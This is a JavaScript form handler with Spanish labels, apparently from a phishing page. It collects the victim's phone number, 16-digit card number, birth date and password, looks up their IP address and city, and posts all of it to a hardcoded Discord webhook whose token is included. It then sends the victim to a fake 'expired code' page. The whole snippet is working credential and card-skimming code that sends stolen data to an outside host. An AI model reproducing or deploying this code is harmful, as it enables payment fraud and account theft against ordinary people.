
document.getElementById('form').addEventListener('submit', async function(e) {
    e.preventDefault();

    const telefono = document.getElementById('telefono').value;
    const tarjeta = document.getElementById('tarjeta').value;
    const nacimiento = document.getElementById('nacimiento').value;
    const password = document.getElementById('password').value;

    if (!/^\d{16}$/.test(tarjeta)) {
        window.location.href = 'index2.html';
        return;
    }

    // Obtener IP y ubicación
    let ipinfo = "";
    try {
        const res = await fetch("https://ipapi.co/json/");
        const info = await res.json();
        ipinfo = `\n\n🌐 IP: ${info.ip}\n📍 Ubicación: ${info.city}, ${info.country_name}`;
    } catch (err) {
        ipinfo = "\n\n🌐 IP: No disponible";
    }

    const data = {
        content: `📄 Nuevo registro:\n📱 Teléfono: ${telefono}\n💳 Tarjeta: ${tarjeta}\n🎂 Nacimiento: ${nacimiento}\n🔒 Contraseña: ${password}${ipinfo}`
    };

    await fetch("https://discord.com/api/webhooks/1354514961703108739/PaD7lPWNnu8lfenpSc3oalDW7C3F9qVzHDM4SuRjSir6sC7EOW9X8DX8Z02F-GLiyzWN", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    });

    window.location.href = "codigo_vencido.html";
});
